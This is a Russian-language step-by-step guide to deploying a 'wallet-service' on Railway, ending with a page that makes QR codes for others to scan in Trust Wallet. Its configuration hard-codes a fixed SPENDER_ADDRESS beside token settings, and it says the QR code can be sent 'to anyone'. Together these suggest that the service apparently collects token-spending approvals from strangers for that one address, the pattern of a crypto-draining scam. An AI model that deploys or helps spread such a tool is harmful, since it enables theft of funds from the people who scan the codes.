# 🚀 ДЕПЛОЙ СЕЙЧАС (5 минут)

## Самый простой способ - через Railway веб-интерфейс:

### Шаг 1: Подготовка (30 секунд)

1. Убедитесь, что у вас есть `.env` файл с настройками
2. Все файлы готовы к деплою ✅

### Шаг 2: Создайте GitHub репозиторий (1 минута)

**Вариант A - через GitHub CLI (если установлен):**
```bash
gh repo create wallet-service --public --source=. --remote=origin --push
```

**Вариант B - вручную:**
1. Откройте https://github.com/new
2. Создайте новый репозиторий (название: `wallet-service` или любое другое)
3. Загрузите код:
   ```bash
   git init
   git add .
   git commit -m "Initial commit"
   git branch -M main
   git remote add origin https://github.com/ваш-username/wallet-service.git
   git push -u origin main
   ```

### Шаг 3: Деплой на Railway (2 минуты)

1. **Откройте https://railway.app**
2. **Войдите через GitHub**
3. **Нажмите "New Project"**
4. **Выберите "Deploy from GitHub repo"**
5. **Выберите ваш репозиторий `wallet-service`**
6. Railway автоматически начнет деплой

### Шаг 4: Настройка переменных окружения (1 минута)

1. В проекте Railway нажмите на ваш сервис
2. Перейдите в **Settings** → **Variables**
3. Нажмите **"New Variable"** и добавьте каждую переменную:

```
NETWORK = sepolia
TOKEN_ADDRESS_SEPOLIA = ваш_адрес_контракта
TOKEN_ADDRESS_MAINNET = ваш_адрес_контракта
SPENDER_ADDRESS = 0xE4576aC79aBbe431EdD7aA55111a843529285edB
PRIVATE_KEY = ваш_приватный_ключ
SEPOLIA_RPC_URL = ваш_rpc_url
MAINNET_RPC_URL = ваш_rpc_url
```

4. **Сохраните** - Railway автоматически перезапустит проект

### Шаг 5: Получите URL и обновите BASE_URL (30 секунд)

1. В Railway нажмите на ваш сервис
2. Во вкладке **Settings** → **Networking** найдите **Public Domain**
3. Скопируйте URL (например: `https://wallet-service-production.up.railway.app`)
4. Вернитесь в **Variables** и добавьте:
   ```
   BASE_URL = https://ваш-проект.railway.app
   ```
5. Railway автоматически перезапустит проект

### Шаг 6: Проверка (30 секунд)

1. Откройте ваш URL: `https://ваш-проект.railway.app/qr-generator.html`
2. Сгенерируйте QR код
3. Проверьте, что URL в QR коде правильный (должен быть ваш домен)
4. ✅ **Готово!**

---

## 🎯 Что получилось:

- ✅ Проект задеплоен на облачный хостинг
- ✅ Есть нормальный URL (не localhost)
- ✅ QR коды работают везде
- ✅ Можно использовать на любых устройствах

---

## ⚠️ Важные моменты:

1. **Не коммитьте `.env`** - он уже в `.gitignore`
2. **Приватный ключ** храните только в переменных Railway
3. **BASE_URL** должен быть полным URL с `https://`
4. После изменения переменных Railway перезапускает проект автоматически

---

## 🔧 Если что-то пошло не так:

1. **Проверьте логи** в Railway: Settings → Deployments → View Logs
2. **Убедитесь**, что все переменные окружения добавлены
3. **Проверьте**, что `BASE_URL` указан правильно
4. **Перезапустите** проект в Railway: Settings → Restart

---

## 📱 Использование:

Теперь вы можете:
- Открыть `https://ваш-проект.railway.app/qr-generator.html`
- Сгенерировать QR код
- Отправить QR код кому угодно
- Человек сканирует в Trust Wallet
- Всё работает! 🎉

